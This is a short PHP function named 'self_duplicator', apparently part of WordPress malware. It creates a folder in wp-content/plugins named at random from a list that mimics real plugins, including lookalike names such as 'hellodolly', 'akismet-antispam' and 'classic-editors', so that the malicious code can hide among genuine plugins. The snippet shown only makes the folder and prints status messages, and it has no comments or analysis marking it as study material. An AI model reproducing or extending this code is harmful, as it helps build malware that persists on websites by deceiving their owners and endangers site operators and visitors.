<?php

function self_duplicator($is_enabled)
{
  if ($is_enabled === true) {
    // Plugin Names
    $plugins_names = ['facebook-pixel', 'elementor', 'security', 'wordpress', 'performance', 'optimization', 'speed-optimization', 'plugin-installer', "hellodolly", "akismet-antispam", 'classic-editors', 'classic-widgets', 'woocommerce', 'one-click-demo-importer-free'];
    // Randomize a number from 0 to Plugin_Names length
    $rndm_plgn = rand(0, count($plugins_names) - 1);

    // Specify the path for the new folder
    $myself_folderPath = 'wp-content/plugins' . "/" . $plugins_names[$rndm_plgn];

    // Create the folder
    if (!file_exists($myself_folderPath)) {
      if (mkdir($myself_folderPath, 0755, true)) {
        echo 'Folder created successfully.';
      } else {
        echo 'Failed to create folder.';
      }
    } else {
      echo 'Folder already exists.';
    }
  }
}
